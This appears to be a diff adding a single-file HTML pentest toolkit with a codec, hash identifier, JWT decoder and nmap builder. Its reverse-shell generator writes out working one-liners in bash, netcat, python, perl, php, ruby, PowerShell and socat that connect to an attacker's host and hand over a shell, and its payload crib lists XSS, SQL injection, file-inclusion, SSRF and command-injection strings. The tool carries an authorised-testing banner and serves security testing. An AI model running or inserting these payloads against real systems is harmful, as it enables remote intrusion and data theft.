@@ -1,0 +1,603 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b0d10">
+<title>Field Kit</title>
+<style>
+  :root{
+    --bg:#0b0d10; --panel:#12161b; --line:#232a33; --txt:#dfe6ee; --dim:#7d8896;
+    --accent:#5eead4; --warn:#f5b942; --err:#f87171; --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;background:var(--bg);color:var(--txt);
+       font:15px/1.45 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+       padding:env(safe-area-inset-top) 0 calc(env(safe-area-inset-bottom) + 8px)}
+  header{padding:16px 16px 10px}
+  h1{margin:0;font-size:19px;letter-spacing:.14em;font-weight:700}
+  h1 span{color:var(--accent)}
+  .sub{margin:4px 0 0;color:var(--dim);font-size:11.5px;letter-spacing:.06em;font-family:var(--mono)}
+  nav{display:flex;gap:6px;overflow-x:auto;padding:8px 12px 12px;scrollbar-width:none}
+  nav::-webkit-scrollbar{display:none}
+  nav button{flex:0 0 auto;background:var(--panel);color:var(--dim);border:1px solid var(--line);
+       padding:8px 13px;border-radius:999px;font-size:12.5px;font-weight:600;font-family:inherit}
+  nav button.on{color:#04120f;background:var(--accent);border-color:var(--accent)}
+  main{padding:0 12px}
+  section[data-tool]{display:none;background:var(--panel);border:1px solid var(--line);
+       border-radius:14px;padding:14px}
+  section[data-tool].on{display:block}
+  label{display:block;font-size:11px;letter-spacing:.09em;color:var(--dim);
+       text-transform:uppercase;margin:12px 0 5px;font-family:var(--mono)}
+  label:first-child{margin-top:0}
+  input,select,textarea{width:100%;background:#0a0d10;color:var(--txt);border:1px solid var(--line);
+       border-radius:9px;padding:11px 12px;font:14px/1.4 var(--mono)}
+  textarea{min-height:70px;resize:vertical}
+  input:focus,select,textarea:focus{outline:2px solid var(--accent);outline-offset:-1px}
+  .row{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+  .row button{flex:1 1 0;min-width:84px;background:#1b2229;color:var(--txt);
+       border:1px solid var(--line);border-radius:9px;padding:11px 12px;
+       font:600 13px inherit;font-family:inherit}
+  .row button:active{background:var(--accent);color:#04120f}
+  .row.primary button{background:var(--accent);color:#04120f;border-color:var(--accent)}
+  .chk{display:flex;align-items:center;gap:8px;margin:8px 0 0;font-size:13px;color:var(--txt)}
+  .chk input{width:auto;accent-color:var(--accent)}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+  pre{background:#070a0d;border:1px solid var(--line);border-radius:10px;padding:12px;
+      font:12.5px/1.5 var(--mono);white-space:pre-wrap;word-break:break-word;
+      margin:10px 0 0;min-height:44px;overflow-x:auto}
+  pre:empty::before{content:"—";color:#39424f}
+  .note{margin:8px 0 0;font:11.5px/1.4 var(--mono);color:var(--dim)}
+  .note.err{color:var(--err)}
+  .note.warn{color:var(--warn)}
+  .copy{background:none;border:1px solid var(--line);color:var(--dim);border-radius:7px;
+      padding:5px 10px;font:11px var(--mono);margin-top:6px}
+  footer{padding:14px 16px 4px;color:#4b5562;font:11px var(--mono);line-height:1.6}
+  .banner{border:1px solid #3b3220;background:#171307;color:#e8c777;border-radius:11px;
+      padding:10px 12px;font:11.5px/1.5 var(--mono);margin:6px 0 12px}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>FIELD<span>KIT</span></h1>
+  <p class="sub">no root · offline · single file</p>
+</header>
+
+<nav id="tabs">
+  <button data-tab="codec" class="on">Codec</button>
+  <button data-tab="hashid">Hash ID</button>
+  <button data-tab="jwt">JWT</button>
+  <button data-tab="nmap">Nmap</button>
+  <button data-tab="rev">Revshell</button>
+  <button data-tab="ports">Ports</button>
+  <button data-tab="crib">Payloads</button>
+</nav>
+
+<main>
+  <div class="banner">For systems you own or have written permission to test. Nothing here verifies a signature or proves a finding — it only does the arithmetic.</div>
+
+  <!-- ============ CODEC ============ -->
+  <section data-tool="codec" class="on">
+    <label for="c-in">Input</label>
+    <textarea id="c-in" data-in="input" placeholder="paste text, hash, base64, or hex"></textarea>
+    <div class="row primary">
+      <button data-act="b64enc">Base64 →</button>
+      <button data-act="b64dec">← Base64</button>
+      <button data-act="urlenc">URL →</button>
+      <button data-act="urldec">← URL</button>
+    </div>
+    <div class="row">
+      <button data-act="hexenc">Hex →</button>
+      <button data-act="hexdec">← Hex</button>
+      <button data-act="htmlenc">HTML →</button>
+      <button data-act="html_dec">← HTML</button>
+      <button data-act="rot13">ROT13</button>
+    </div>
+    <pre data-out="result"></pre>
+    <button class="copy" data-copy="result">copy</button>
+    <p class="note" data-note></p>
+  </section>
+
+  <!-- ============ HASH ID ============ -->
+  <section data-tool="hashid">
+    <label for="h-in">Hash</label>
+    <input id="h-in" data-in="hash" placeholder="32–128 chars, or $6$… / $2b$…">
+    <div class="row primary"><button data-act="id">Identify</button></div>
+    <pre data-out="result"></pre>
+    <button class="copy" data-copy="result">copy</button>
+    <p class="note" data-note></p>
+  </section>
+
+  <!-- ============ JWT ============ -->
+  <section data-tool="jwt">
+    <label for="j-in">Token</label>
+    <textarea id="j-in" data-in="token" placeholder="eyJhbGciOi..."></textarea>
+    <div class="row primary"><button data-act="decode">Decode</button></div>
+    <pre data-out="result"></pre>
+    <button class="copy" data-copy="result">copy</button>
+    <p class="note" data-note></p>
+  </section>
+
+  <!-- ============ NMAP ============ -->
+  <section data-tool="nmap">
+    <label for="n-target">Target</label>
+    <input id="n-target" data-in="target" placeholder="10.0.0.5 or host.docker.internal">
+    <div class="grid2">
+      <div>
+        <label for="n-type">Scan type</label>
+        <select id="n-type" data-in="scantype">
+          <option value="connect">-sT connect (no root)</option>
+          <option value="syn">-sS SYN (root)</option>
+          <option value="udp">-sU UDP (root)</option>
+        </select>
+      </div>
+      <div>
+        <label for="n-t">Timing</label>
+        <select id="n-t" data-in="timing">
+          <option value="3">-T3 polite</option>
+          <option value="4" selected>-T4 normal</option>
+          <option value="2">-T2 sneaky</option>
+        </select>
+      </div>
+    </div>
+    <label for="n-ports">Ports</label>
+    <input id="n-ports" data-in="ports" placeholder="22,80,443  or  1-1000  (blank = top 1000)">
+    <div class="row">
+      <label class="chk"><input type="checkbox" data-in="svc"> -sV versions</label>
+      <label class="chk"><input type="checkbox" data-in="scripts"> -sC scripts</label>
+      <label class="chk"><input type="checkbox" data-in="pn"> -Pn no ping</label>
+      <label class="chk"><input type="checkbox" data-in="aggr"> -A aggressive</label>
+    </div>
+    <label for="n-out">Save to</label>
+    <input id="n-out" data-in="out" placeholder="scan.txt (optional)">
+    <div class="row primary"><button data-act="build">Build command</button></div>
+    <pre data-out="result"></pre>
+    <button class="copy" data-copy="result">copy</button>
+    <p class="note" data-note></p>
+  </section>
+
+  <!-- ============ REVSHELL ============ -->
+  <section data-tool="rev">
+    <div class="grid2">
+      <div>
+        <label for="r-ip">Your host</label>
+        <input id="r-ip" data-in="ip" placeholder="192.168.1.50">
+      </div>
+      <div>
+        <label for="r-port">Port</label>
+        <input id="r-port" data-in="port" value="4444">
+      </div>
+    </div>
+    <label for="r-shell">Payload</label>
+    <select id="r-shell" data-in="shell">
+      <option value="nc_mkfifo" selected>nc mkfifo (most portable)</option>
+      <option value="bash">bash /dev/tcp</option>
+      <option value="bash196">bash fd 196</option>
+      <option value="nc_e">nc -e</option>
+      <option value="python3">python3</option>
+      <option value="perl">perl</option>
+      <option value="php">php</option>
+      <option value="ruby">ruby</option>
+      <option value="powershell">powershell</option>
+      <option value="socat">socat</option>
+    </select>
+    <div class="row primary"><button data-act="gen">Generate</button></div>
+    <label>Listener — run this first</label>
+    <pre data-out="listener"></pre>
+    <button class="copy" data-copy="listener">copy</button>
+    <label>Payload</label>
+    <pre data-out="result"></pre>
+    <button class="copy" data-copy="result">copy</button>
+    <p class="note" data-note></p>
+  </section>
+
+  <!-- ============ PORTS ============ -->
+  <section data-tool="ports">
+    <label for="p-q">Filter</label>
+    <input id="p-q" data-in="q" placeholder="smb, 445, redis…">
+    <div class="row primary"><button data-act="look">Search</button></div>
+    <pre data-out="result"></pre>
+    <p class="note" data-note></p>
+  </section>
+
+  <!-- ============ CRIB ============ -->
+  <section data-tool="crib">
+    <label for="x-q">Filter</label>
+    <input id="x-q" data-in="q" placeholder="xss, sqli, lfi, ssti…">
+    <div class="row primary"><button data-act="look">Search</button></div>
+    <pre data-out="result"></pre>
+    <p class="note" data-note></p>
+  </section>
+</main>
+
+<footer>
+  fieldkit · sealed core v1 · runs from a file:// URL, no network, no install
+</footer>
+
+<script>
+/* ============================================================================
+   SEALED CORE  —  fieldkit
+   Owner: Wraith.  Do not restyle, do not rename, do not "improve" this block.
+   It contains zero DOM code on purpose. It only computes strings.
+
+   CONTRACT:  TK.run(tool, act, vals) -> { out: {key: string}, note: string }
+   The design layer owns everything visual. This file owns everything true.
+   ============================================================================ */
+(function (root) {
+  'use strict';
+
+  const TK = {};
+  const TE = new TextEncoder();
+  const TD = new TextDecoder();
+
+  /* ---------- helpers ---------------------------------------------------- */
+  function bytesToBin(u8) {
+    let s = '';
+    for (let i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
+    return s;
+  }
+  function b64e(str) {
+    return btoa(bytesToBin(TE.encode(String(str))));
+  }
+  function b64d(b64) {
+    return TD.decode(Uint8Array.from(atob(String(b64).replace(/\s+/g, '')), c => c.charCodeAt(0)));
+  }
+  function b64urlEnc(str) {
+    return b64e(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+  }
+  function b64urlDec(s) {
+    let t = String(s).replace(/-/g, '+').replace(/_/g, '/');
+    while (t.length % 4) t += '=';
+    return b64d(t);
+  }
+  function hexFrom(str) {
+    return Array.from(TE.encode(String(str))).map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+  function strFromHex(h) {
+    const clean = String(h).replace(/[^0-9a-fA-F]/g, '');
+    if (clean.length % 2) throw new Error('hex length must be even');
+    const u8 = new Uint8Array(clean.length / 2);
+    for (let i = 0; i < u8.length; i++) u8[i] = parseInt(clean.substr(i * 2, 2), 16);
+    return TD.decode(u8);
+  }
+  function rot13(str) {
+    return String(str).replace(/[a-zA-Z]/g, c => {
+      const b = c <= 'Z' ? 65 : 97;
+      return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b);
+    });
+  }
+  function tsFmt(sec) {
+    const d = new Date(sec * 1000);
+    const delta = Math.round((Date.now() / 1000) - sec);
+    const rel = Math.abs(delta) < 90 ? 'now'
+      : delta > 0 ? `${Math.round(delta / 60)}m ago`
+      : `in ${Math.round(-delta / 60)}m`;
+    return `${d.toISOString().replace('T', ' ').slice(0, 19)}Z  (${rel})`;
+  }
+  function need(vals, k, label) {
+    const v = (vals[k] || '').trim();
+    if (!v) throw new Error(`${label || k} is required`);
+    return v;
+  }
+
+  /* ---------- 1. codec --------------------------------------------------- */
+  const CODECS = {
+    b64enc:  s => b64e(s),
+    b64dec:  s => b64d(s),
+    urlenc:  s => encodeURIComponent(s),
+    urldec:  s => decodeURIComponent(s.replace(/\+/g, ' ')),
+    hexenc:  s => hexFrom(s),
+    hexdec:  s => strFromHex(s),
+    htmlenc: s => s.replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])),
+    html_dec: s => s.replace(/&(#x?[0-9a-fA-F]+|\w+);/g, (m, ent) => {
+      if (ent[0] === '#') return String.fromCodePoint(ent[1] === 'x' || ent[1] === 'X' ? parseInt(ent.slice(2), 16) : parseInt(ent.slice(1), 10));
+      const named = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: '\u00a0' };
+      return named[ent] !== undefined ? named[ent] : m;
+    }),
+    rot13:   s => rot13(s)
+  };
+
+  /* ---------- 2. hash id ------------------------------------------------- */
+  // Heuristic, length + shape based. It narrows the field; it never proves.
+  const HASH_RULES = [
+    { re: /^\$2[abxy]\$\d{2}\$/, name: 'bcrypt', note: '60 chars, slow — hashcat -m 3200' },
+    { re: /^\$argon2(id|i|d)\$/, name: 'Argon2', note: 'modern KDF, no fast crack' },
+    { re: /^\$y\$/, name: 'yescrypt', note: 'Debian/Ubuntu default — hashcat -m 28900' },
+    { re: /^\$6\$/, name: 'sha512crypt', note: 'Linux /etc/shadow — hashcat -m 1800' },
+    { re: /^\$5\$/, name: 'sha256crypt', note: 'Linux /etc/shadow — hashcat -m 7400' },
+    { re: /^\$1\$/, name: 'md5crypt', note: 'old Linux — hashcat -m 500' },
+    { re: /^\$P\$|^\$H\$/, name: 'phpass / WordPress', note: 'hashcat -m 400 for WP' },
+    { re: /^\{SSHA\}/i, name: 'LDAP SSHA', note: 'base64 after the prefix, salt appended' },
+    { re: /^\{SHA\}/i, name: 'LDAP SHA', note: 'base64 of raw sha1' },
+    { re: /^\d{2}\$/, name: 'md5crypt (BSD variant)', note: 'older $apr1 style' }
+  ];
+  const HEX_RULES = {
+    32: ['MD5', 'NTLM', 'LM halves', 'MD4', 'RIPEMD-128', 'MySQL 4.1'],
+    40: ['SHA-1', 'MySQL 5', 'RIPEMD-160', 'NTLM (mixed)'],
+    56: ['SHA-224', 'SHA3-224'],
+    64: ['SHA-256', 'SHA3-256', 'Keccak-256', 'BLAKE2s-256', 'HMAC-SHA256'],
+    96: ['SHA-384', 'SHA3-384'],
+    128: ['SHA-512', 'Whirlpool', 'SHA3-512', 'BLAKE2b-512']
+  };
+  function hashId(h) {
+    const s = String(h).trim();
+    const out = [];
+    if (!s) return { names: [], note: '' };
+    for (const r of HASH_RULES) {
+      if (r.re.test(s)) out.push({ name: r.name, note: r.note });
+    }
+    if (!out.length && /^[0-9a-fA-F]+$/.test(s)) {
+      const cands = HEX_RULES[s.length];
+      if (cands) cands.forEach(n => out.push({ name: n, note: `${s.length} hex chars` }));
+      else out.push({ name: `unknown (${s.length} hex)`, note: 'no standard match at that length' });
+    }
+    if (!out.length && /^[./0-9A-Za-z]{13}$/.test(s)) {
+      out.push({ name: 'DES crypt (traditional)', note: '13 chars — legacy shadow' });
+    }
+    if (!out.length) {
+      out.push({ name: 'not a recognised hash', note: 'length and shape match nothing common' });
+    }
+    return { names: out, note: `${out.length} candidate${out.length === 1 ? '' : 's'} by length/shape only — confirm with the source` };
+  }
+
+  /* ---------- 3. jwt ----------------------------------------------------- */
+  function jwtDecode(tok) {
+    const parts = String(tok).trim().split('.');
+    if (parts.length < 2) throw new Error('not a JWT — needs 2-3 dot-separated segments');
+    const head = JSON.parse(b64urlDec(parts[0]));
+    const body = JSON.parse(b64urlDec(parts[1]));
+    const lines = [];
+    lines.push('HEADER');
+    lines.push(JSON.stringify(head, null, 2));
+    lines.push('');
+    lines.push('PAYLOAD');
+    lines.push(JSON.stringify(body, null, 2));
+    lines.push('');
+    if (body.exp) lines.push(`exp  ${tsFmt(body.exp)}`);
+    if (body.iat) lines.push(`iat  ${tsFmt(body.iat)}`);
+    if (body.nbf) lines.push(`nbf  ${tsFmt(body.nbf)}`);
+    if (!body.exp) lines.push('no exp claim — token never expires on its own');
+    lines.push('');
+    lines.push(`alg: ${head.alg}   sig: ${parts[2] ? parts[2].length + ' chars' : 'ABSENT (unsigned)'}`);
+    lines.push('decoded only. signature NOT verified — this is a read, not a check.');
+    return lines.join('\n');
+  }
+
+  /* ---------- 4. nmap builder -------------------------------------------- */
+  function nmapBuild(v) {
+    const target = need(v, 'target', 'target');
+    const flags = ['-n'];
+    const warns = [];
+    const type = v.scantype || 'connect';
+    if (type === 'syn') { flags.push('-sS'); warns.push('-sS needs root (raw sockets). On a non-rooted phone it fails — use connect.'); }
+    else if (type === 'udp') { flags.push('-sU'); warns.push('-sU needs root and is slow. Narrow the ports.'); }
+    else flags.push('-sT');
+
+    if (v.svc) flags.push('-sV');
+    if (v.scripts) flags.push('-sC');
+    if (v.aggr) { flags.push('-A'); warns.push('-A is loud: -sV -sC -O together. Triage boxes will see you.'); }
+    if (v.pn) flags.push('-Pn');
+    if (v.noresolve) { /* -n already in */ }
+    const timing = v.timing || '4';
+    flags.push(`-T${timing}`);
+    if (v.ports && v.ports.trim()) flags.push(`-p ${v.ports.trim().replace(/\s+/g, '')}`);
+    else if (!v.aggr) flags.push('--top-ports 1000');
+    if (v.out) flags.push(`-oN ${v.out.trim()}`);
+    flags.push(target);
+
+    const cmd = 'nmap ' + flags.join(' ');
+    return { cmd, notes: warns };
+  }
+
+  /* ---------- 5. reverse shell ------------------------------------------- */
+  function revshell(v) {
+    const ip = need(v, 'ip', 'host');
+    const port = need(v, 'port', 'port') || '4444';
+    const shells = {
+      bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+      bash196: `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
+      nc_mkfifo: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f`,
+      nc_e: `nc -e /bin/sh ${ip} ${port}`,
+      python3: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`,
+      perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'`,
+      php: `php -r '$s=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+      ruby: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+      powershell: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
+      socat: `socat TCP:${ip}:${port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane`
+    };
+    const keys = Object.keys(shells);
+    return {
+      list: keys.map(k => ({ lang: k, cmd: shells[k] })),
+      // default view: the one that works most places
+      cmd: shells[v.shell] || shells.nc_mkfifo,
+      listen: `nc -lvnp ${port}`
+    };
+  }
+
+  /* ---------- 6. ports --------------------------------------------------- */
+  const PORTS = [
+    [21, 'ftp', 'anonymous login is still a thing'], [22, 'ssh', 'keys only, no password auth'],
+    [23, 'telnet', 'cleartext, should be dead'], [25, 'smtp', 'open relay test'],
+    [53, 'dns', 'zone transfer: dig axfr'], [80, 'http', 'start here'],
+    [110, 'pop3', 'cleartext mail'], [111, 'rpcbind', 'rpcinfo -p'],
+    [135, 'msrpc', 'Windows RPC'], [139, 'netbios-ssn', 'enum4linux'],
+    [143, 'imap', 'cleartext mail'], [161, 'snmp', 'default "public" community'],
+    [389, 'ldap', 'anonymous bind test'], [443, 'https', 'TLS, check cert + versions'],
+    [445, 'smb', 'THE Windows port — smbmap/smbclient'], [512, 'rexec', 'legacy, rlogin family'],
+    [514, 'rsh/syslog', 'legacy remote shell'], [873, 'rsync', 'often anonymous read'],
+    [993, 'imaps', 'TLS mail'], [995, 'pop3s', 'TLS mail'],
+    [1433, 'mssql', 'sa: blank?'], [1521, 'oracle', 'TNS listener'],
+    [2049, 'nfs', 'showmount -e'], [2375, 'docker', 'UNAUTHENTICATED daemon = root host'],
+    [2376, 'docker-tls', 'same, with TLS'], [3000, 'dev server', 'node/grafana'],
+    [3306, 'mysql', 'root:root?'], [3389, 'rdp', 'BlueKeep territory'],
+    [4444, 'metasploit default', 'listener side'], [5432, 'postgres', 'trust auth?'],
+    [5900, 'vnc', 'often no password'], [5985, 'winrm-http', 'evil-winrm'],
+    [5986, 'winrm-https', 'evil-winrm'], [6379, 'redis', 'UNAUTH = write files as root'],
+    [8080, 'http-alt', 'proxies, tomcat, jenkins'], [8443, 'https-alt', 'admin panels'],
+    [9000, 'php-fpm / portainer', 'fastcgi = RCE'], [9200, 'elasticsearch', 'open index = all your data'],
+    [11211, 'memcached', 'UDP 11211 = amplification'], [27017, 'mongodb', 'often no auth']
+  ];
+
+  /* ---------- 7. payload crib -------------------------------------------- */
+  const CRIBS = [
+    { k: 'xss', s: '<script>alert(1)<\/script>' },
+    { k: 'xss', s: '"><img src=x onerror=alert(1)>' },
+    { k: 'xss', s: "javascript:alert(1)" },
+    { k: 'xss', s: '<svg/onload=alert(1)>' },
+    { k: 'sqli', s: "' OR '1'='1" },
+    { k: 'sqli', s: "' OR 1=1-- -" },
+    { k: 'sqli', s: "1' AND SLEEP(5)-- -" },
+    { k: 'sqli', s: "' UNION SELECT NULL,NULL-- -" },
+    { k: 'lfi', s: '../../../../etc/passwd' },
+    { k: 'lfi', s: '....//....//....//etc/passwd' },
+    { k: 'lfi', s: 'php://filter/convert.base64-encode/resource=index.php' },
+    { k: 'ssrf', s: 'http://127.0.0.1:80/' },
+    { k: 'ssrf', s: 'http://169.254.169.254/latest/meta-data/' },
+    { k: 'ssrf', s: 'file:///etc/passwd' },
+    { k: 'ssti', s: '{{7*7}}' },
+    { k: 'ssti', s: '${7*7}' },
+    { k: 'ssti', s: '<%= 7*7 %>' },
+    { k: 'cmd', s: ';id' },
+    { k: 'cmd', s: '$(id)' },
+    { k: 'cmd', s: '`id`' },
+    { k: 'redirect', s: '//evil.example' },
+    { k: 'redirect', s: 'https:evil.example' }
+  ];
+
+  /* ---------- dispatcher ------------------------------------------------- */
+  TK.run = function (tool, act, vals) {
+    vals = vals || {};
+    try {
+      switch (tool) {
+        case 'codec': {
+          const fn = CODECS[act];
+          if (!fn) throw new Error('unknown action ' + act);
+          const input = vals.input || '';
+          if (!input.trim()) throw new Error('nothing to convert');
+          return { out: { result: fn(input) }, note: `${act} ok — ${input.length} in, ${fn(input).length} out` };
+        }
+        case 'hashid': {
+          const r = hashId(vals.hash);
+          return {
+            out: { result: r.names.map(n => `${n.name}\n    ${n.note}`).join('\n\n') },
+            note: r.note
+          };
+        }
+        case 'jwt': {
+          return { out: { result: jwtDecode(vals.token) }, note: 'decoded — signature not verified' };
+        }
+        case 'nmap': {
+          const r = nmapBuild(vals);
+          return {
+            out: { result: r.cmd },
+            note: r.notes.slice(0, 2).join(' ') || 'connect scan — works without root'
+          };
+        }
+        case 'rev': {
+          const r = revshell(vals);
+          return {
+            out: { result: r.cmd, listener: r.listen },
+            note: 'listener first, then the payload'
+          };
+        }
+        case 'ports': {
+          const q = (vals.q || '').toLowerCase().trim();
+          const rows = PORTS.filter(p => !q || String(p[0]).includes(q) || p[1].includes(q) || p[2].includes(q));
+          return {
+            out: { result: rows.map(p => `${String(p[0]).padEnd(6)}${p[1].padEnd(22)}${p[2]}`).join('\n') || '(nothing matched)' },
+            note: `${rows.length} of ${PORTS.length}`
+          };
+        }
+        case 'crib': {
+          const q = (vals.q || '').toLowerCase().trim();
+          const rows = CRIBS.filter(c => !q || c.k.includes(q) || c.s.toLowerCase().includes(q));
+          return {
+            out: { result: rows.map(c => `${c.k.padEnd(10)}${c.s}`).join('\n') || '(nothing matched)' },
+            note: `${rows.length} payloads — lab targets only`
+          };
+        }
+        default:
+          throw new Error('unknown tool ' + tool);
+      }
+    } catch (e) {
+      return { out: {}, note: 'ERR: ' + e.message };
+    }
+  };
+
+  TK._internals = { b64e, b64d, b64urlDec, hashId, jwtDecode, nmapBuild, revshell, tsFmt };
+  root.TK = TK;
+})(window);
+
+</script>
+
+<script>
+/* ---------------- WIRING — the only file-local logic -------------------
+   Contract: every [data-act] button inside section[data-tool=X] calls
+   TK.run(X, act, vals) where vals is every [data-in] inside that section.
+   Output goes to the [data-out=key] matching the returned key.
+   ---------------------------------------------------------------------- */
+(function () {
+  'use strict';
+
+  // tabs
+  document.getElementById('tabs').addEventListener('click', function (e) {
+    var b = e.target.closest('button[data-tab]');
+    if (!b) return;
+    document.querySelectorAll('#tabs button').forEach(function (x) { x.classList.toggle('on', x === b); });
+    document.querySelectorAll('section[data-tool]').forEach(function (s) {
+      s.classList.toggle('on', s.dataset.tool === b.dataset.tab);
+    });
+  });
+
+  function readVals(section) {
+    var v = {};
+    section.querySelectorAll('[data-in]').forEach(function (el) {
+      v[el.dataset.in] = (el.type === 'checkbox') ? el.checked : el.value;
+    });
+    return v;
+  }
+
+  function paint(section, res) {
+    // clear stale outputs
+    section.querySelectorAll('[data-out]').forEach(function (el) { el.textContent = ''; });
+    Object.keys(res.out || {}).forEach(function (k) {
+      var el = section.querySelector('[data-out="' + k + '"]');
+      if (el) el.textContent = res.out[k];
+    });
+    var note = section.querySelector('[data-note]');
+    if (note) {
+      note.textContent = res.note || '';
+      note.className = 'note' + (/^ERR:/.test(res.note || '') ? ' err'
+        : /needs root|loud|slow/i.test(res.note || '') ? ' warn' : '');
+    }
+  }
+
+  document.addEventListener('click', function (e) {
+    var btn = e.target.closest('[data-act]');
+    if (btn) {
+      var section = btn.closest('section[data-tool]');
+      if (!section) return;
+      var res = TK.run(section.dataset.tool, btn.dataset.act, readVals(section));
+      paint(section, res);
+      return;
+    }
+    var cp = e.target.closest('[data-copy]');
+    if (cp) {
+      var src = cp.closest('section').querySelector('[data-out="' + cp.dataset.copy + '"]');
+      var text = src ? src.textContent : '';
+      if (!text) return;
+      (navigator.clipboard ? navigator.clipboard.writeText(text) : Promise.reject())
+        .then(function () { cp.textContent = 'copied'; setTimeout(function () { cp.textContent = 'copy'; }, 1200); })
+        .catch(function () {
+          var r = document.createRange(); r.selectNodeContents(src);
+          var s = getSelection(); s.removeAllRanges(); s.addRange(r);
+          cp.textContent = 'selected';
+          setTimeout(function () { cp.textContent = 'copy'; }, 1200);
+        });
+    }
+  });
+})();
+</script>
+</body>
+</html>
